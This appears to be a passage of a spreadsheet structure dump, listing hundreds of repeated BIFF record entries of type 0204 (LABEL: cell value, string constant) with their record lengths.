' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     19 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     19 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     19 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     18 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     19 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     15 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     18 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     15 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     19 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     19 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     19 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     16 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     16 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     16 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     15 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     19 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     18 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     17 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     19 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     17 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     19 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     16 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     19 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     19 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     19 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     16 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     15 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     15 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     19 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     19 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     19 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     15 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     19 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     18 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     15 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     15 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     19 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     19 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     18 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     16 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     17 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     17 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     16 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     19 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     19 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     19 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     19 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     16 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     19 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     16 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     19 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     19 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     19 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     16 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     16 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     19 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     18 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     19 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     17 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     19 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     19 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     19 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     19 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     19 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     19 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     15 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     19 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     16 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     19 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     15 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     19 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     15 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     19 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     18 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     19 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     19 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     18 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     18 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     18 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     19 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     19 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     19 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     15 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     19 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     19 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     19 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     19 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     19 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     16 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     16 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     17 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     16 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     19 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     18 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     16 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     17 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
